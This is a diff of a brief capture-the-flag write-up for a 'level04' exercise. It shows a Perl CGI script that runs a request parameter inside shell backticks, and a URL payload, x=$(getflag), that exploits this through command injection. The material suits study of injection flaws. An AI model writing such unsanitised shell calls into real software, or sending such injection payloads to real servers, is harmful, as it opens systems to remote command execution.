@@ -1,12 +1,10 @@
 $> cat level04.pl
-#!/usr/bin/perl
-# localhost:4747
-use CGI qw{param};
-print "Content-type: text/html\n\n";
-sub x {
-  $y = $_[0];
+[...]
   print `echo $y 2>&1`;
-}
-x(param("x"));
-$> # We need to do a HTTP request with argument x=$(getflag)
-$> # http://localhost:4747?x=$(getflag) Enjoy your token
+[...]
+
+# Code is being executed with the backticks
+
+# We need to inject our getflag argument here
+
+(navigator) http://$(VM_IP):4747?x=$(getflag)
